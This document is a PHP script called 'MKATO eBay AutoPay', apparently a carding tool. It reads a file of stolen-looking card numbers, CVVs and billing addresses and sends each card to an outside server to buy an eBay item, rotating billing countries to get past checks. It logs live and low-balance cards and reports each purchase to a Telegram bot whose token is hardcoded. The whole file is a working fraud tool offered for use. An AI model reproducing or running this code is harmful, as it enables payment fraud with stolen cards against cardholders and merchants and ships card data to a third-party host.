<?php
/**
 * MKATO EBAY AUTO PAY
 */
error_reporting(0);
set_time_limit(0);
$setting=[
"url" 						=> "https://pay.ebay.com/rgxo?action=create&rypsvc=true&pagename=ryp&item=123306711552&quantity=1&transactionid=-1&rev=24",
"file" 						=> "cc.txt",
"notiftotelegram"			=> true,
"telegramid"				=> 614082239,
"retrycountry"				=> false,
"autostop"					=> true,
];

$address = array(
	"firstName"			 => "amos",
	"lastName"			 => "kun",
	"addressLine1"		 => "3501 Jack Northrop Ave",
	"addressLine2"		 => "Suite #",
	"stateOrProvince"	 => "CA",
	"city"				 => "Hawthorne",
	"postalCode"		 => "90250",
	"country"			 => "US",
	"phoneNumber"		 => "5005681586",
	"phonecountrycode"   => "1",
	"email"				 => "anjinglo@gmail.com",
);	

class autoPay 
{   
	protected $server = "http://autopay.mkato.club/";
	protected $file;
	protected $setting;
	protected $address;
	protected $defaultcountry = "CK";
	protected $country = array('IS', 'MY', 'CK', 'NZ', 'PG', 'GU', 'HN', 'HK', 'TC', 'SR', 'RW', 'RE', 'NU', 'NI', 'MZ', 'MX', 'ID');
	protected $selected_country;
	protected $getcountry;
	function __construct($address, $setting)
	{
		if (!is_dir('eBay_log')) {
			mkdir('eBay_log');
		}
		$this->autostop = $setting['autostop'];
		$this->addrshipping = $address;
		$this->url = $setting['url'];
		$this->notifcontrol = $setting['notiftotelegram'];
		$this->ccfile = file($setting['file']);
		$this->total = count($this->ccfile);
		$this->user_id = $setting['telegramid'];
		$itemid = $this->mid($setting['url'], "item=", "&");
		echo "       
       ".$this->color('red','.')."
     ".$this->color('red',"'':''")."
    ___:____     |''\/''|   ".$this->color('greenbg',"MKATO eBay AutoPay")."
  ,'        `.    \    /    ".$this->color('purple',"Version 1.0")."
  |  O        \___/   |     ".$this->color('red',"Free Trial")."
".$this->color('red',"~^~^~^~^~^~^~^~^~^~^~^~^~")."
";;
		echo "{$this->color('bluebg', 'Your Setting')} :".PHP_EOL;
		echo "{$this->color('yellow', 'Url')}       	 : ".$setting['url'].PHP_EOL;
		echo "{$this->color('yellow', 'File')}      	 : ".$setting['file'].PHP_EOL;
		echo "{$this->color('yellow', 'Retry')}     	 : "; echo $setting['retrycountry'] ? $this->color('greenbg', 'YES') : $this->color('redbg', 'NO'); echo PHP_EOL;
		echo "{$this->color('yellow', 'Auto Stop')} 	 : "; echo $setting['autostop'] ? $this->color('greenbg', 'YES') : $this->color('redbg', 'NO'); echo PHP_EOL;
		echo "{$this->color('yellow', 'Notification')}	 : "; echo $setting['notiftotelegram'] ? $this->color('greenbg', 'YES') : $this->color('redbg', 'NO'); echo PHP_EOL;
		echo PHP_EOL.PHP_EOL;
		echo "{$this->color('bluebg', 'Your Item Cart Details')} : ".PHP_EOL;
		$this->itms = $this->getItem($setting);
		if ($this->itms) {
			$notif = array(
				'<b>' . $this->itms['item'] . '</b>',
				'',
				'Price : <i>' . $this->itms['price'] . '</i>',
				'Item ID : <a href="https://ebay.com/itm/' . $itemid . '">' . $itemid . '</a>',
				'Seller : ' . $this->itms['seller'],
				'Remain Qty : ' . $this->itms['sold'].'/'.$this->itms['stock'],
				'',
				'',
				'',
				'<b>eBay AutoPay by AmosKun</b>'
			);
			$this->notification(implode(PHP_EOL, $notif));
			$this->no = 1;
			if ($setting['retrycountry'] == true) {
				foreach ($this->ccfile as $getcc) {
					$this->formcc = $getcc;
					foreach ($this->country as $getcountry) {
						$this->selected_country = $getcountry;
						$get = $this->buy($getcc, $this->selected_country);
					}
				$this->no++;
				}
			}else{
				foreach ($this->ccfile as $getcc) {
					$this->formcc = $getcc;
					$this->selected_country = $this->defaultcountry;
					$get = $this->buy($getcc, $this->selected_country);
					$this->no++;
				}
			}
			$this->notification('AutoPay Job has been completed!');
			echo $this->color('greenbg','Thank you for using AutoPay. AutoPay Job has been completed!');
		}else{
			echo $this->color('redbg', "Error: Can't Fetch the Item!");
			exit();
		}
		
		echo PHP_EOL.PHP_EOL;

	}

	function getItem($control){
		$itemid = $this->mid($control['url'], "item=", "&");
		$req = json_decode($this->http($this->server."?set=getitem&item=".$itemid), true); 
		if ($req) {
			echo "Item : ".$this->color('green',html_entity_decode($req['item'])).PHP_EOL;
			echo "Price : ".$this->color('red',html_entity_decode($req['price'])).PHP_EOL;
			echo "Seller : ".$this->color('bluebg',html_entity_decode($req['seller']))." *(".$this->color('purple', html_entity_decode($req['score'])).")".PHP_EOL;
			echo "RemainQty : ".$this->color('yellow',html_entity_decode($req['stock']))."/".$this->color('red', html_entity_decode($req['sold'])).PHP_EOL;
			return $req;
		}
		return false;
	}
	function buy($data, $country){
		$ccs = explode("|", $data);
		$billing = array();
		$billing['cardHolderFirstName'] = rtrim($ccs[4]);
		$billing['cardHolderLastName']  = rtrim($ccs[5]);
		$billing['cardNumber'] 			= rtrim($ccs[0]);
		$billing['cardExpiryDate'] 		= "20".rtrim($ccs[2]) . "-" . rtrim($ccs[1]) . "-01";
		$billing['securityCode'] 		= rtrim($ccs[3]);
		$billing['addrLine1'] 			= rtrim($ccs[6]);
		$billing['addrLine2'] 			= rtrim($ccs[7]);
		$billing['city'] 				= rtrim($ccs[8]);
		$billing['state'] 				= rtrim($ccs[9]);
		$billing['postalCode']			= rtrim($ccs[10]);
		$billing['country'] 			= rtrim($country);
		$billing['phoneNumber']			= $this->addrshipping['phoneNumber'];
		$most = array('url' => $this->url, 'addr' => json_encode($this->addrshipping), 'bill' => json_encode($billing));
		$msso = $this->http($this->server."?set=purchase",$most);
		if ($msso) {
			$msso = json_decode($msso);
			$card = rtrim($ccs[0])."|".rtrim($ccs[1])."|".rtrim($ccs[2])."|".rtrim($ccs[3]);
			$this->status_code = $msso->code;
			$this->status($card, $msso, $this->status_code);
			return true;
		}
		return false;

	}
	function notification($text) {
		if ($this->notifcontrol == true) {
			$req = json_decode($this->http('https://api.telegram.org/bot716730109:AAGfPWd5tKfuYYq7NHAvNlEosLOaR1JoFcg/sendmessage?chat_id=' . $this->user_id . '&text=' . urlencode($text) . '&parse_mode=html'));
			if($req) {
				return true;
			} return false;
		} return false;
			
	}
		
	function header(){
		return "[".$this->color("yellow", 'MKATO')."]";
	}
	function color($color, $text){
		if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
			return $text;
		} else {
		    switch ($color) {
				case 'greenbg':
					$warna = "\033[1;37;42m"; break;
				case 'redbg':
					$warna = "\033[1;37;41m"; break;
				case 'bluebg':
					$warna = "\033[1;37;44m"; break;
				case 'yellowbg':
					$warna = "\033[1;37;43m"; break;
				case 'purple':
           			 $warna = "\033[1;35m"; break;
				case 'green':
					$warna = "\033[1;32m"; break;
				case 'red':
					$warna = "\033[1;31m"; break;
				case 'blue':
					$warna = "\033[1;34m"; break;
				case 'yellow':
					$warna = "\033[1;33;40m"; break;
				default:
					$warna = "\033[0m"; break;
			}
			return $warna.$text."\033[0m";
		}
	}
	function http($url, $post = false, $headers = false){
	    $ch = curl_init();
	    curl_setopt($ch, CURLOPT_URL, $url);
	    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	    curl_setopt($ch, CURLOPT_COOKIEJAR, 'eBay_log/mkato_cookie.txt');
	    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . 'eBay_log/mkato_cookie.txt');
	    if ($post) {
	        curl_setopt($ch, CURLOPT_POST, true);
	        curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
	    }
	    if ($headers) {
	        curl_setopt($ch, CURLOPT_HEADER, 0);
	        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
	    }
	    
	    $response = curl_exec($ch);
	    curl_close($ch);
	    return $response;
	}

	function mid($content, $start, $end){
	    preg_match_all("|$start(.*?)$end|", $content, $out);
	    return $out[1][0];
	}

	function status($card, $data, $code){
		$format = array(
			$this->no,
			$this->total,
			$data->ip,
			$this->color('yellow', $card),
			$data->addshiping == 'GOOD' ? $this->color('greenbg', 'GOOD') : $this->color('redbg', 'BAD'),
			$this->selected_country,
			$data->addcard == 'GOOD' ? $this->color('greenbg', 'GOOD') : $this->color('redbg', 'BAD'),
			$data->code,
			$this->addrshipping['email']
		);
		switch($code) {
			case 100:
				$notif 	= array(
					'<b>Confirmed</b>',
					'Confirmation send to <b>' .  $this->addrshipping['email'] . '</b>',
					'(' . $this->no . '/' . $this->total . ')   <i>' . $card . '</i>',
					'Using country : ' . $this->selected_country,
					'IP : ' . $data->ip
				);
				$this->notification(implode(PHP_EOL, $notif));
				$string = '[%d/%d] IP : %s - %s - SET SHIPPING [%s] - SET CARD [%s|%s] - OUTPUT [%s] ' . $this->color('greenbg', 'Confirmed') . ' | Confirmation send to %s' . PHP_EOL;
				$string = vsprintf($string, $format);
				file_put_contents("eBay_log/success.txt", $this->formcc."| item: ".$this->itms['item']."| price: ".$this->itms['price'].PHP_EOL, FILE_APPEND);
				if($this->autostop == true) {
					die($string);
				} else {
					echo $string;
				}
				break;
			case 200:
				$string = '[%d/%d] IP : %s - %s - SET SHIPPING [%s] - SET CARD [%s|%s] - OUTPUT [%s] ' . $this->color('yellow','Live low balance') . PHP_EOL;
				$string = vsprintf($string, $format);
				echo $string;
				file_put_contents("eBay_log/cc_live_lowbalance.txt", $this->formcc.PHP_EOL, FILE_APPEND);
				break;
			case 300:
				$string = '[%d/%d] IP : %s - %s - SET SHIPPING [%s] - SET CARD [%s|%s] - OUTPUT [%s] ' . $this->color('redbg', 'Declined') . PHP_EOL;
				$string = vsprintf($string, $format);
				echo $string;
				break;
			case 400:
				$string = '[%d/%d] IP : %s - %s - SET SHIPPING [%s] - SET CARD [%s|%s] - OUTPUT [%s] ' . $this->color('red', 'We can\'t proccess your payment') . PHP_EOL;
				$string = vsprintf($string, $format);
				echo $string;
				break;
			case 500:
				$string = '[%d/%d] IP : %s - %s - SET SHIPPING [%s] - SET CARD [%s|%s] - OUTPUT [%s] ' . $this->color('red', 'We can\'t process your PayPal payment. Please contact PayPal customer support') . PHP_EOL;
				$string = vsprintf($string, $format);
				echo $string;
				break;
			case 600:
				$string = '[%d/%d] IP : %s - %s - SET SHIPPING [%s] - SET CARD [%s|%s] - OUTPUT [%s] ' . $this->color('redbg', 'Something went wrong') . PHP_EOL;
				$string = vsprintf($string, $format);
				echo $string;
				file_put_contents("eBay_log/error_pay.txt", $this->formcc.PHP_EOL, FILE_APPEND);
				break;
			case 700:
				$string = '[%d/%d] IP : %s - %s - SET SHIPPING [%s] - SET CARD [%s|%s] - OUTPUT [%s] ' . $this->color('yellow', 'Invalid payment format') . PHP_EOL;
				$string = vsprintf($string, $format);
				file_put_contents("eBay_log/error_pay.txt", $this->formcc.PHP_EOL, FILE_APPEND);
				echo $string;
				break;
			case 800:
				$string = '[%d/%d] IP : %s - %s - SET SHIPPING [%s] - SET CARD [%s|%s] - OUTPUT [%s] ' . $this->color('red', 'Payment (VBV) Page Refused to grant') . ' | Retrying ...' . PHP_EOL;
				$string = vsprintf($string, $format);
				echo $string;
				break;
			case 900:
				$string = '[%d/%d] IP : %s - %s - SET SHIPPING [%s] - SET CARD [%s|%s] - OUTPUT [%s] ' . $this->color('redbg', 'Unknown error') . PHP_EOL;
				$string = vsprintf($string, $format);
				echo $string;
				file_put_contents("eBay_log/cc_unknown.txt", $this->formcc.PHP_EOL, FILE_APPEND);
				break;
		}
	}
}

$eBay = new autoPay($address, $setting);
